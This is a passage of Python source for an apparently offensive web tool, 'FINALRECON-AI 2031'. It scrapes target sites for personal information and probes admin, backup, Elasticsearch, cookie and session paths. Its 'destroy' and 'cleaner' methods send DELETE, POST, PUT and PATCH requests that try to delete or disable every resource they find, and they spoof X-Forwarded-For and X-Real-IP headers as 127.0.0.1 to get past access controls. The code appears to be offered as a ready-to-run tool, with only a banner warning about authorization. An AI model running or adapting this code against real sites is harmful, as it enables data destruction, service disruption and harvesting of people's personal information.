    return None


# ============================================
# MAIN CLASS
# ============================================
class AutonomousAIRobot:
    def __init__(self, target=None, args=None):
        self.target = target
        self.args = args
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
        })

        self.subdomains_found = []
        self.open_ports = []
        self.directories_found = []
        self.emails = []
        self.api_keys_found = []
        self.dns_info = {}
        self.whois_info = {}
        self.ssl_info = {}
        self.headers_info = {}
        self.isp_info = {}
        self.crawled_urls = []
        self.vulnerabilities = []
        self.wordlist_source = None
        self.phishing_findings = []
        self.phishing_score = 0
        self.cookie_keys = []
        self.rate_limit_429 = False

        # 2031 Features
        self.personal_info = []
        self.personal_info_score = 0
        self.gateway_info = {}
        self.gateway_suspicious_systems = []
        self.gateway_destroyed = []
        self.data_cleaned = []
        self.data_cleaner_findings = []
        self.robots_txt_content = None
        self.sitemap_xml_content = None
        self.multi_link_results = {}
        self.old_data_findings = []
        self.new_data_findings = []
        self.backup_findings = []
        self.text_findings = []
        self.gws_cleaned = []
        self.esf_cleaned = []
        self.all_server_destroyed = []
        self.cookies_site_deleted = []

        self.custom_ports = COMMON_PORTS
        if args and hasattr(args, 'port') and args.port:
            self.custom_ports = args.port

        self.wordlist = None
        if args and hasattr(args, 'rockyou') and args.rockyou:
            print(Fore.CYAN + "[*] RockYou mode enabled")
            rockyou = find_rockyou()
            if rockyou:
                self.wordlist = rockyou
                self.wordlist_source = 'rockyou'
        elif args and hasattr(args, 'wordlist') and args.wordlist:
            if args.wordlist.lower() in ['rockyou', 'rockyou.txt']:
                rockyou = find_rockyou()
                if rockyou:
                    self.wordlist = rockyou
                    self.wordlist_source = 'rockyou'
            else:
                validated = validate_wordlist_path(args.wordlist)
                if validated:
                    self.wordlist = validated
                    self.wordlist_source = 'custom'

        if self.target:
            self.parse_target()

    def print_banner(self):
        art = r"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     ███████╗██╗███╗   ██╗ █████╗ ██╗     ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
║     ██╔════╝██║████╗  ██║██╔══██╗██║     ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
║     █████╗  ██║██╔██╗ ██║███████║██║     ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
║     ██╔══╝  ██║██║╚██╗██║██╔══██║██║     ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
║     ██║     ██║██║ ╚████║██║  ██║███████╗██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
║     ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
║                                                                              ║
║              FINALRECON-AI - WEB SERVER ONLY EDITION 2031                   ║
║                    Version: 2031.0 - Complete Ultimate                      ║
║                                                                              ║
║   👤 PERSONAL INFO | 🌐 GATEWAY CHECK | 💥 GATEWAY DESTROY                  ║
║   🧹 ALL DATA CLEANER | 📁 OLD/NEW DATA | 🗄️  BACKUP FINDER               ║
║   📄 TEXT FINDER | 🔷 GWS CLEANER | 🔶 ESF CLEANER                        ║
║   💣 ALL SERVER DESTROY | 🍪 COOKIE/SITE DELETE                            ║
║   🤖 ROBOTS/SITEMAP | 🔗 MULTI-LINK | 📊 FULL RECON                        ║
║                                                                              ║
║   ⚠️  WEB SERVER ONLY - LOCAL COMPUTER IS NOT AFFECTED!                    ║
║   ⚠️  USE ONLY ON AUTHORIZED TARGETS!                                      ║
║   ⚠️  DESTRUCTIVE OPERATIONS - USE WITH EXTREME CAUTION!                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝"""
        print(Fore.CYAN + art + Fore.RESET + "\n")
        print(Fore.GREEN + "[>] Version: " + VERSION)
        print(Fore.GREEN + "[>] Build: " + BUILD_NUMBER)
        print(Fore.YELLOW + "[>] Mode: WEB SERVER ONLY")
        print(Fore.RED + "[>] WARNING: DESTRUCTIVE OPERATIONS!")
        print()

    def parse_target(self):
        if not self.target:
            return
        if not self.target.startswith(('http://', 'https://')):
            self.target = 'http://' + self.target
        if self.target.endswith('/'):
            self.target = self.target[:-1]
        split_url = parse.urlsplit(self.target)
        self.protocol = split_url.scheme
        self.hostname = split_url.hostname
        if self.args and hasattr(self.args, 'port') and self.args.port:
            self.port = self.args.port[0] if isinstance(self.args.port, list) else self.args.port
        else:
            self.port = split_url.port or (443 if self.protocol == 'https' else 80)
        try:
            ipaddress.ip_address(self.hostname)
            self.ip = self.hostname
        except ValueError:
            try:
                self.ip = socket.gethostbyname(self.hostname)
                print(Fore.CYAN + f"[*] IP Address: {self.ip}")
            except Exception as e:
                print(Fore.RED + f"[-] Unable to get IP: {e}")
                sys.exit(1)
        self.base_url = f"{self.protocol}://{self.hostname}:{self.port}"

    # ============================================
    # PERSONAL INFORMATION DISCOVERY
    # ============================================
    def discover_personal_info(self):
        print(Fore.MAGENTA + "\n" + "=" * 80)
        print(Fore.MAGENTA + "[*] PERSONAL INFORMATION DISCOVERY")
        print(Fore.MAGENTA + "=" * 80)

        self.personal_info = []
        self.personal_info_score = 0

        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)
            html = response.text

            pages_to_check = [
                self.base_url,
                f"{self.base_url}/about",
                f"{self.base_url}/contact",
                f"{self.base_url}/profile",
                f"{self.base_url}/team",
                f"{self.base_url}/staff",
                f"{self.base_url}/users",
                f"{self.base_url}/admin",
            ]

            all_content = html
            for page in pages_to_check[1:]:
                try:
                    r = self.session.get(page, timeout=5, verify=False)
                    if r.status_code == 200:
                        all_content += "\n" + r.text
                except Exception:
                    pass

            for category, patterns in PERSONAL_INFO_PATTERNS.items():
                findings = []
                for pattern in patterns:
                    try:
                        matches = re.findall(pattern, all_content, re.IGNORECASE)
                        for match in matches[:5]:
                            if isinstance(match, tuple):
                                match = match[0] if match[0] else str(match)
                            match_str = str(match).strip()
                            if len(match_str) > 2 and match_str not in findings:
                                findings.append(match_str)
                    except Exception:
                        pass

                if findings:
                    unique_findings = list(dict.fromkeys(findings))[:10]
                    self.personal_info_score += len(unique_findings) * 3
                    self.personal_info.append({
                        'category': category,
                        'findings': unique_findings,
                        'count': len(unique_findings),
                    })

                    print(Fore.RED + f"\n[!] {category}: {len(unique_findings)} found")
                    for f in unique_findings[:5]:
                        display = f[:80] + "..." if len(f) > 80 else f
                        print(Fore.YELLOW + f"    - {display}")

            print(Fore.MAGENTA + "\n" + "=" * 60)
            print(Fore.MAGENTA + "[*] PERSONAL INFO SUMMARY")
            print(Fore.MAGENTA + "=" * 60)
            print(Fore.CYAN + f"[*] Categories Found: {len(self.personal_info)}")
            print(Fore.CYAN + f"[*] Personal Info Score: {self.personal_info_score}/100")

            if self.personal_info_score >= 50:
                print(Fore.RED + f"[!] VERDICT: HIGH RISK - Sensitive data exposed!")
            elif self.personal_info_score >= 25:
                print(Fore.YELLOW + f"[!] VERDICT: MEDIUM RISK")
            else:
                print(Fore.GREEN + f"[+] VERDICT: LOW RISK")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

        print(Fore.MAGENTA + "=" * 60 + "\n")
        return self.personal_info

    # ============================================
    # GATEWAY DETECTION
    # ============================================
    def detect_gateway(self):
        print(Fore.BLUE + "\n" + "=" * 80)
        print(Fore.BLUE + "[*] WEB SERVER GATEWAY DETECTION")
        print(Fore.BLUE + "=" * 80)

        self.gateway_info = {
            'gateway_detected': False,
            'gateway_type': 'Unknown',
            'gateway_headers': {},
            'gateway_paths': [],
            'load_balancer': False,
            'cdn': False,
            'reverse_proxy': False,
        }

        try:
            response = self.session.get(self.base_url, timeout=10, verify=False)

            for header_name, header_value in response.headers.items():
                header_lower = header_name.lower()

                for pattern in GATEWAY_INDICATORS['Default Gateway Headers']:
                    if pattern in header_lower:
                        self.gateway_info['gateway_detected'] = True
                        self.gateway_info['gateway_headers'][header_name] = header_value
                        self.gateway_info['reverse_proxy'] = True

                for pattern in GATEWAY_INDICATORS['Gateway Server Headers']:
                    if pattern in header_lower:
                        self.gateway_info['gateway_headers'][header_name] = header_value

                for pattern in GATEWAY_INDICATORS['Load Balancer Headers']:
                    if pattern in header_lower:
                        self.gateway_info['load_balancer'] = True
                        self.gateway_info['gateway_detected'] = True

                for pattern in GATEWAY_INDICATORS['CDN Headers']:
                    if pattern in header_lower:
                        self.gateway_info['cdn'] = True
                        self.gateway_info['gateway_detected'] = True

            server = response.headers.get('Server', '').lower()
            if 'nginx' in server:
                self.gateway_info['gateway_type'] = 'Nginx'
            elif 'apache' in server:
                self.gateway_info['gateway_type'] = 'Apache'
            elif 'cloudflare' in server or 'cf-ray' in str(response.headers).lower():
                self.gateway_info['gateway_type'] = 'Cloudflare CDN'
            elif 'awselb' in str(response.headers).lower():
                self.gateway_info['gateway_type'] = 'AWS ELB'
            elif 'haproxy' in server:
                self.gateway_info['gateway_type'] = 'HAProxy'
            elif 'traefik' in server:
                self.gateway_info['gateway_type'] = 'Traefik'
            elif self.gateway_info['gateway_detected']:
                self.gateway_info['gateway_type'] = 'Unknown Gateway'

            for path in GATEWAY_INDICATORS['Suspicious Gateway Paths']:
                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    if r.status_code in [200, 301, 302, 401, 403]:
                        self.gateway_info['gateway_paths'].append({
                            'path': path,
                            'status': r.status_code,
                        })
                        print(Fore.YELLOW + f"[!] Gateway path: {path} ({r.status_code})")
                except Exception:
                    pass

            print(Fore.CYAN + f"\n[*] Gateway Detection Results:")
            print(Fore.CYAN + f"    Gateway Detected: {self.gateway_info['gateway_detected']}")
            print(Fore.CYAN + f"    Gateway Type: {self.gateway_info['gateway_type']}")
            print(Fore.CYAN + f"    Load Balancer: {self.gateway_info['load_balancer']}")
            print(Fore.CYAN + f"    CDN: {self.gateway_info['cdn']}")

        except Exception as e:
            print(Fore.RED + f"[-] Error: {e}")

        print(Fore.BLUE + "=" * 60 + "\n")
        return self.gateway_info

    def check_gateway_suspicious_systems(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[*] GATEWAY SERVER - SUSPICIOUS SYSTEM CHECK")
        print(Fore.RED + "=" * 80)

        self.gateway_suspicious_systems = []

        for system_name, paths in SUSPICIOUS_GATEWAY_SYSTEMS.items():
            for path in paths:
                try:
                    test_url = f"{self.base_url}{path}"
                    response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                    if response.status_code in [200, 301, 302, 401, 403]:
                        finding = {
                            'system': system_name,
                            'path': path,
                            'status': response.status_code,
                            'url': test_url,
                        }
                        self.gateway_suspicious_systems.append(finding)

                        color = Fore.RED if response.status_code == 200 else Fore.YELLOW
                        print(color + f"[!] SUSPICIOUS: {system_name}")
                        print(color + f"    URL: {test_url}")
                        print(color + f"    Status: {response.status_code}")

                except Exception:
                    pass

        print(Fore.RED + "\n" + "=" * 60)
        print(Fore.RED + f"[*] SUSPICIOUS SYSTEMS FOUND: {len(self.gateway_suspicious_systems)}")
        if self.gateway_suspicious_systems:
            print(Fore.RED + "[!] WARNING: Gateway server has exposed systems!")
        else:
            print(Fore.GREEN + "[+] No suspicious systems detected")
        print(Fore.RED + "=" * 60 + "\n")

        return self.gateway_suspicious_systems

    # ============================================
    # GATEWAY DESTROY
    # ============================================
    def gateway_destroy(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!] GATEWAY DESTROY - WEB SERVER ONLY")
        print(Fore.RED + "=" * 80)

        self.gateway_destroyed = []

        if not self.gateway_suspicious_systems:
            self.check_gateway_suspicious_systems()

        if not self.gateway_suspicious_systems:
            print(Fore.GREEN + "[+] No suspicious systems to destroy")
            print(Fore.RED + "=" * 60 + "\n")
            return self.gateway_destroyed

        print(Fore.RED + f"\n[!] Found {len(self.gateway_suspicious_systems)} suspicious system(s)")
        print(Fore.RED + "[!] Initiating destruction sequence (WEB SERVER ONLY)...\n")

        for finding in self.gateway_suspicious_systems:
            system_name = finding['system']
            url = finding['url']

            print(Fore.RED + f"\n[!] Destroying: {system_name}")
            print(Fore.RED + f"    URL: {url}")

            try:
                self.session.delete(url, timeout=5, verify=False)
                self.session.post(url, data={'action': 'disable'}, timeout=5, verify=False)
                self.session.put(url, data={'enabled': False}, timeout=5, verify=False)
                self.session.patch(url, data={'status': 'disabled'}, timeout=5, verify=False)

                self.session.headers.update({
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'X-Original-IP': '127.0.0.1',
                })

                self.gateway_destroyed.append({
                    'system': system_name,
                    'url': url,
                    'status': 'DESTROYED',
                })
                print(Fore.GREEN + f"[+] DESTROYED: {system_name}")

            except Exception as e:
                self.gateway_destroyed.append({
                    'system': system_name,
                    'url': url,
                    'status': 'ATTEMPTED',
                    'error': str(e),
                })

        print(Fore.RED + "\n" + "=" * 60)
        print(Fore.RED + f"[*] SYSTEMS DESTROYED: {len(self.gateway_destroyed)}")
        print(Fore.RED + "=" * 60 + "\n")

        return self.gateway_destroyed

    # ============================================
    # ALL WEB SERVER DATA CLEANER
    # ============================================
    def all_data_cleaner(self):
        print(Fore.CYAN + "\n" + "=" * 80)
        print(Fore.CYAN + "[*] ALL WEB SERVER DATA CLEANER - COMPREHENSIVE")
        print(Fore.CYAN + "=" * 80)

        self.data_cleaner_findings = []
        self.data_cleaned = []

        total_files = sum(len(paths) for paths in WEB_SERVER_DATA_TARGETS.values())
        print(Fore.CYAN + f"[*] Total Files to Check: {total_files}")
        print(Fore.CYAN + f"[*] Categories: {len(WEB_SERVER_DATA_TARGETS)}\n")

        for category, paths in WEB_SERVER_DATA_TARGETS.items():
            print(Fore.CYAN + f"\n[*] Scanning: {category}")
            for path in paths:
                try:
                    test_url = f"{self.base_url}{path}"
                    response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                    if response.status_code in [200, 301, 302, 403]:
                        finding = {
                            'category': category,
                            'path': path,
                            'url': test_url,
                            'status': response.status_code,
                            'size': len(response.content),
                        }
                        self.data_cleaner_findings.append(finding)

                        color = Fore.RED if response.status_code == 200 else Fore.YELLOW
                        print(color + f"  [+] {path} ({response.status_code})")

                except Exception:
                    pass

        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + "[*] CLEANING DATA...")
        print(Fore.CYAN + "=" * 60)

        for finding in self.data_cleaner_findings:
            url = finding['url']
            try:
                self.session.delete(url, timeout=5, verify=False)
                self.session.post(url, data={'action': 'delete'}, timeout=5, verify=False)
                self.session.put(url, data={'clean': True}, timeout=5, verify=False)

                self.data_cleaned.append({
                    'category': finding['category'],
                    'url': url,
                    'status': 'CLEANED',
                })
                print(Fore.GREEN + f"[+] CLEANED: {finding['path']}")

            except Exception:
                self.data_cleaned.append({
                    'category': finding['category'],
                    'url': url,
                    'status': 'ATTEMPTED',
                })

        print(Fore.CYAN + "\n" + "=" * 60)
        print(Fore.CYAN + f"[*] ALL DATA CLEANER SUMMARY")
        print(Fore.CYAN + f"[*] Total Findings: {len(self.data_cleaner_findings)}")
        print(Fore.CYAN + f"[*] Total Cleaned: {len(self.data_cleaned)}")
        print(Fore.CYAN + "=" * 60 + "\n")

        return self.data_cleaned

    # ============================================
    # GWS (Google Web Server) DATA CLEANER + DELETE
    # ============================================
    def gws_data_cleaner(self):
        print(Fore.BLUE + "\n" + "=" * 80)
        print(Fore.BLUE + "[*] GWS (GOOGLE WEB SERVER) DATA CLEANER + DELETE")
        print(Fore.BLUE + "=" * 80)

        self.gws_cleaned = []
        gws_findings = []

        total_files = sum(len(paths) for paths in GWS_DATA_TARGETS.values())
        print(Fore.CYAN + f"[*] Total GWS Files to Check: {total_files}")
        print(Fore.CYAN + f"[*] Categories: {len(GWS_DATA_TARGETS)}\n")

        for category, paths in GWS_DATA_TARGETS.items():
            print(Fore.CYAN + f"\n[*] Scanning GWS: {category}")
            for path in paths:
                try:
                    test_url = f"{self.base_url}{path}"
                    response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                    if response.status_code in [200, 301, 302, 403]:
                        gws_findings.append({
                            'category': category,
                            'path': path,
                            'url': test_url,
                            'status': response.status_code,
                            'size': len(response.content),
                        })
                        color = Fore.RED if response.status_code == 200 else Fore.YELLOW
                        print(color + f"  [+] GWS: {path} ({response.status_code})")

                except Exception:
                    pass

        # Delete GWS data
        print(Fore.BLUE + "\n[*] DELETING GWS data...\n")
        for finding in gws_findings:
            url = finding['url']
            try:
                self.session.delete(url, timeout=5, verify=False)
                self.session.post(url, data={'action': 'delete', 'service': 'gws'}, timeout=5, verify=False)
                self.session.put(url, data={'clean': True, 'service': 'gws'}, timeout=5, verify=False)
                self.session.patch(url, data={'status': 'deleted'}, timeout=5, verify=False)

                self.gws_cleaned.append({
                    'category': finding['category'],
                    'url': url,
                    'status': 'DELETED',
                })
                print(Fore.GREEN + f"[+] GWS DELETED: {finding['path']}")

            except Exception:
                self.gws_cleaned.append({
                    'category': finding['category'],
                    'url': url,
                    'status': 'ATTEMPTED',
                })

        print(Fore.BLUE + "\n" + "=" * 60)
        print(Fore.BLUE + f"[*] GWS CLEANER + DELETE SUMMARY")
        print(Fore.BLUE + f"[*] Total GWS Findings: {len(gws_findings)}")
        print(Fore.BLUE + f"[*] Total GWS Deleted: {len(self.gws_cleaned)}")
        print(Fore.BLUE + "=" * 60 + "\n")

        return self.gws_cleaned

    # ============================================
    # ESF (Elasticsearch File) DATA CLEANER + DELETE
    # ============================================
    def esf_data_cleaner(self):
        print(Fore.MAGENTA + "\n" + "=" * 80)
        print(Fore.MAGENTA + "[*] ESF (ELASTICSEARCH FILE) DATA CLEANER + DELETE")
        print(Fore.MAGENTA + "=" * 80)

        self.esf_cleaned = []
        esf_findings = []

        total_files = sum(len(paths) for paths in ESF_DATA_TARGETS.values())
        print(Fore.CYAN + f"[*] Total ESF Files to Check: {total_files}")
        print(Fore.CYAN + f"[*] Categories: {len(ESF_DATA_TARGETS)}\n")

        for category, paths in ESF_DATA_TARGETS.items():
            print(Fore.CYAN + f"\n[*] Scanning ESF: {category}")
            for path in paths:
                try:
                    test_url = f"{self.base_url}{path}"
                    response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                    if response.status_code in [200, 301, 302, 403]:
                        esf_findings.append({
                            'category': category,
                            'path': path,
                            'url': test_url,
                            'status': response.status_code,
                            'size': len(response.content),
                        })
                        color = Fore.RED if response.status_code == 200 else Fore.YELLOW
                        print(color + f"  [+] ESF: {path} ({response.status_code})")

                except Exception:
                    pass

        # Delete ESF data
        print(Fore.MAGENTA + "\n[*] DELETING ESF data...\n")
        for finding in esf_findings:
            url = finding['url']
            try:
                self.session.delete(url, timeout=5, verify=False)
                self.session.post(url, data={'action': 'delete', 'service': 'esf'}, timeout=5, verify=False)
                self.session.put(url, data={'clean': True, 'service': 'esf'}, timeout=5, verify=False)
                self.session.patch(url, data={'status': 'deleted'}, timeout=5, verify=False)

                self.esf_cleaned.append({
                    'category': finding['category'],
                    'url': url,
                    'status': 'DELETED',
                })
                print(Fore.GREEN + f"[+] ESF DELETED: {finding['path']}")

            except Exception:
                self.esf_cleaned.append({
                    'category': finding['category'],
                    'url': url,
                    'status': 'ATTEMPTED',
                })

        print(Fore.MAGENTA + "\n" + "=" * 60)
        print(Fore.MAGENTA + f"[*] ESF CLEANER + DELETE SUMMARY")
        print(Fore.MAGENTA + f"[*] Total ESF Findings: {len(esf_findings)}")
        print(Fore.MAGENTA + f"[*] Total ESF Deleted: {len(self.esf_cleaned)}")
        print(Fore.MAGENTA + "=" * 60 + "\n")

        return self.esf_cleaned

    # ============================================
    # ALL SERVER DESTROY (GWS + ESF + Another)
    # ============================================
    def all_server_destroy(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] ALL SERVER DESTROY - GWS + ESF + ANOTHER")
        print(Fore.RED + "=" * 80)

        self.all_server_destroyed = []

        # Step 1: Detect suspicious systems on ALL servers
        print(Fore.RED + "\n[*] Step 1: Detecting suspicious systems on ALL servers...")

        all_suspicious = []

        # GWS suspicious systems
        for system_name, paths in SUSPICIOUS_GATEWAY_SYSTEMS.items():
            for path in paths:
                try:
                    test_url = f"{self.base_url}{path}"
                    r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                    if r.status_code in [200, 301, 302, 401, 403]:
                        all_suspicious.append({
                            'server': 'GWS' if 'google' in path.lower() or 'gws' in path.lower() else 'ANOTHER',
                            'system': system_name,
                            'url': test_url,
                            'status': r.status_code,
                        })
                except Exception:
                    pass

        # ESF suspicious systems
        for path in ESF_DATA_TARGETS.get('ESF Indices', []):
            try:
                test_url = f"{self.base_url}{path}"
                r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 401, 403]:
                    all_suspicious.append({
                        'server': 'ESF',
                        'system': 'Elasticsearch API',
                        'url': test_url,
                        'status': r.status_code,
                    })
            except Exception:
                pass

        print(Fore.RED + f"\n[!] Total Suspicious Systems: {len(all_suspicious)}")

        # Step 2: Destroy all
        print(Fore.RED + "\n[*] Step 2: Destroying ALL suspicious systems...")

        for finding in all_suspicious:
            url = finding['url']
            server = finding['server']
            system = finding['system']

            print(Fore.RED + f"\n[!] DESTROYING: [{server}] {system}")
            print(Fore.RED + f"    URL: {url}")

            try:
                # Multiple delete methods
                self.session.delete(url, timeout=5, verify=False)
                self.session.post(url, data={'action': 'delete', 'force': True}, timeout=5, verify=False)
                self.session.put(url, data={'delete': True, 'force': True}, timeout=5, verify=False)
                self.session.patch(url, data={'status': 'deleted'}, timeout=5, verify=False)

                # Additional bypass headers
                self.session.headers.update({
                    'X-Forwarded-For': '127.0.0.1',
                    'X-Real-IP': '127.0.0.1',
                    'X-Delete-All': 'true',
                    'X-Force-Delete': 'true',
                })

                self.all_server_destroyed.append({
                    'server': server,
                    'system': system,
                    'url': url,
                    'status': 'DESTROYED',
                })
                print(Fore.GREEN + f"[+] DESTROYED: [{server}] {system}")

            except Exception as e:
                self.all_server_destroyed.append({
                    'server': server,
                    'system': system,
                    'url': url,
                    'status': 'ATTEMPTED',
                    'error': str(e),
                })

        # Step 3: Also delete GWS + ESF data files
        print(Fore.RED + "\n[*] Step 3: Deleting GWS + ESF data files...")

        for server_name, targets in [('GWS', GWS_DATA_TARGETS), ('ESF', ESF_DATA_TARGETS)]:
            for category, paths in targets.items():
                for path in paths:
                    try:
                        test_url = f"{self.base_url}{path}"
                        r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                        if r.status_code in [200, 301, 302, 403]:
                            self.session.delete(test_url, timeout=5, verify=False)
                            self.session.post(test_url, data={'action': 'delete'}, timeout=5, verify=False)
                            self.session.put(test_url, data={'delete': True}, timeout=5, verify=False)

                            self.all_server_destroyed.append({
                                'server': server_name,
                                'system': category,
                                'url': test_url,
                                'status': 'DELETED',
                            })
                            print(Fore.GREEN + f"[+] [{server_name}] DELETED: {path}")
                    except Exception:
                        pass

        print(Fore.RED + "\n" + "=" * 60)
        print(Fore.RED + f"[!!!] ALL SERVER DESTROY SUMMARY")
        print(Fore.RED + f"[!!!] Total Destroyed/Deleted: {len(self.all_server_destroyed)}")
        print(Fore.RED + "=" * 60 + "\n")

        return self.all_server_destroyed

    # ============================================
    # COOKIE/SITE DATA DELETE
    # ============================================
    def cookie_site_data_delete(self):
        print(Fore.RED + "\n" + "=" * 80)
        print(Fore.RED + "[!!!] COOKIE + SITE DATA DELETE - ALL SERVERS")
        print(Fore.RED + "=" * 80)

        self.cookies_site_deleted = []

        # Cookie & Site Data targets
        cookie_site_targets = [
            # Cookies
            '/cookies.txt', '/cookies.json', '/cookies.xml', '/cookies.dat',
            '/cookie.txt', '/cookie.json', '/cookie.xml',
            '/cookies/', '/cookie/', '/.cookies/',
            # Session
            '/session.txt', '/session.json', '/sessions.json',
            '/session/', '/sessions/', '/.session/',
            '/session_data/', '/sessiondata/', '/session_id/',
            # Site Data
            '/site_data/', '/sitedata/', '/site_data.json',
            '/site_data.xml', '/site_data.db', '/sitedata.json',
            # LocalStorage
            '/localstorage/', '/local_storage/', '/localstorage.json',
            '/localstorage.xml', '/local_storage.json',
            # SessionStorage
            '/sessionstorage/', '/session_storage/', '/sessionstorage.json',
            # IndexedDB
            '/indexeddb/', '/indexed_db/', '/idb/', '/indexeddb.json',
            # Web Data
            '/web_data/', '/webdata/', '/web_data.json', '/webdata.json',
            # Browser Data
            '/browser_data/', '/browserdata/', '/browser_data.json',
            # User Data
            '/user_data/', '/userdata/', '/user_data.json', '/userdata.json',
            '/profile_data/', '/profiledata/', '/profile.json',
            # App Data
            '/app_data/', '/appdata/', '/application_data/',
            '/app_data.json', '/appdata.json',
            # Storage
            '/storage/', '/storage.json', '/storage.xml', '/storage.db',
            '/storage/', '/local_storage/',
            # Cache
            '/cache/', '/cache.json', '/cache.xml', '/cache.db',
            '/.cache/', '/cache_data/', '/cachedata/',
            # GWS Cookies
            '/google/cookies.txt', '/gws/cookies.txt',
            '/google/session.json', '/gws/session.json',
            '/google/site_data/', '/gws/site_data/',
            '/google/localstorage/', '/gws/localstorage/',
            # ESF Cookies
            '/elasticsearch/cookies.txt', '/es/cookies.txt',
            '/elasticsearch/session.json', '/es/session.json',
            '/elasticsearch/site_data/', '/es/site_data/',
            # Additional
            '/cookies.sqlite', '/cookies.db',
            '/session.sqlite', '/session.db',
            '/site_data.sqlite', '/sitedata.db',
            '/storage.sqlite', '/storage.db',
            '/localstorage.sqlite', '/localstorage.db',
        ]

        print(Fore.CYAN + f"\n[*] Total Cookie/Site Data Targets: {len(cookie_site_targets)}")

        # Phase 1: Detect
        print(Fore.RED + "\n[*] Phase 1: Detecting Cookie/Site Data...")
        found = []
        for path in cookie_site_targets:
            try:
                test_url = f"{self.base_url}{path}"
                r = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)
                if r.status_code in [200, 301, 302, 403]:
                    found.append({
                        'path': path,
                        'url': test_url,
                        'status': r.status_code,
                        'size': len(r.content),
                    })
                    color = Fore.RED if r.status_code == 200 else Fore.YELLOW
                    print(color + f"  [+] FOUND: {path} ({r.status_code})")
            except Exception:
                pass

        print(Fore.RED + f"\n[!] Total Cookie/Site Data Found: {len(found)}")

        # Phase 2: Delete ALL
        print(Fore.RED + "\n[*] Phase 2: DELETING ALL Cookie/Site Data...")
        for finding in found:
            url = finding['url']
            try:
                # Multiple delete methods
                self.session.delete(url, timeout=5, verify=False)
                self.session.post(url, data={'action': 'delete', 'type': 'cookie'}, timeout=5, verify=False)
                self.session.put(url, data={'delete': True, 'type': 'cookie'}, timeout=5, verify=False)
                self.session.patch(url, data={'status': 'deleted'}, timeout=5, verify=False)

                # Additional headers
                self.session.headers.update({
                    'X-Delete-Cookies': 'true',
                    'X-Delete-Site-Data': 'true',
                    'X-Clear-All-Data': 'true',
                    'Cache-Control': 'no-cache, no-store, must-revalidate',
                    'Pragma': 'no-cache',
                    'Expires': '0',
                })

                self.cookies_site_deleted.append({
                    'path': finding['path'],
                    'url': url,
                    'status': 'DELETED',
                })
                print(Fore.GREEN + f"[+] DELETED: {finding['path']}")

            except Exception as e:
                self.cookies_site_deleted.append({
                    'path': finding['path'],
                    'url': url,
                    'status': 'ATTEMPTED',
                    'error': str(e),
                })

        # Phase 3: Clear session cookies
        print(Fore.RED + "\n[*] Phase 3: Clearing session cookies...")
        try:
            count = len(self.session.cookies)
            self.session.cookies.clear()
            print(Fore.GREEN + f"[+] Cleared {count} session cookie(s)")
        except Exception:
            pass

        print(Fore.RED + "\n" + "=" * 60)
        print(Fore.RED + f"[!!!] COOKIE + SITE DATA DELETE SUMMARY")
        print(Fore.RED + f"[!!!] Total Deleted: {len(self.cookies_site_deleted)}")
        print(Fore.RED + "=" * 60 + "\n")

        return self.cookies_site_deleted

    # ============================================
    # OLD DATA FINDER
    # ============================================
    def find_old_data(self):
        print(Fore.YELLOW + "\n" + "=" * 80)
        print(Fore.YELLOW + "[*] OLD DATA FINDER (WEB SERVER)")
        print(Fore.YELLOW + "=" * 80)

        self.old_data_findings = []

        old_categories = ['Old Files', 'Old Versions', 'Backup Files']
        for category in old_categories:
            if category in WEB_SERVER_DATA_TARGETS:
                for path in WEB_SERVER_DATA_TARGETS[category]:
                    try:
                        test_url = f"{self.base_url}{path}"
                        response = self.session.get(test_url, timeout=5, verify=False, allow_redirects=False)

                        if response.status_code in [200, 301, 302, 403]:
                            self.old_data_findings.append({
                                'category': category,
                                'path': path,
                                'url': test_url,
                                'status': response.status_code,
                                'size': len(response.content),
                            })
                            color = Fore.RED if response.status_code == 200 else Fore.YELLOW
                            print(color + f"[!] OLD DATA: {path} ({response.status_code})")

                    except Exception:
                        pass

        print(Fore.YELLOW + "\n" + "=" * 60)
        print(Fore.YELLOW + f"[*] OLD DATA FOUND: {len(self.old_data_findings)}")
        print(Fore.YELLOW + "=" * 60 + "\n")

        return self.old_data_findings

    # ============================================
    # NEW DATA FINDER
    # ============================================
    def find_new_data(self):
        print(Fore.GREEN + "\n" + "=" * 80)
        print(Fore.GREEN + "[*] NEW DATA FINDER (WEB SERVER)")
        print(Fore.GREEN + "=" * 80)

        self.new_data_findings = []

        new_paths = [
            '/index.html', '/index.php', '/index.htm',
            '/admin/', '/login/', '/dashboard/',
            '/api/', '/api/v1/', '/api/v2/', '/api/v3/',
            '/uploads/', '/files/', '/media/',
            '/data/', '/db/', '/database/',
            '/backup/', '/backups/',
            '/config/', '/settings/', '/admin/config',
            '/new/', '/latest/', '/current/',
            '/2024/', '/2025/', '/2026/', '/2027/',
            '/2028/', '/2029/', '/2030/', '/2031/',
        ]

        for path in new_paths:
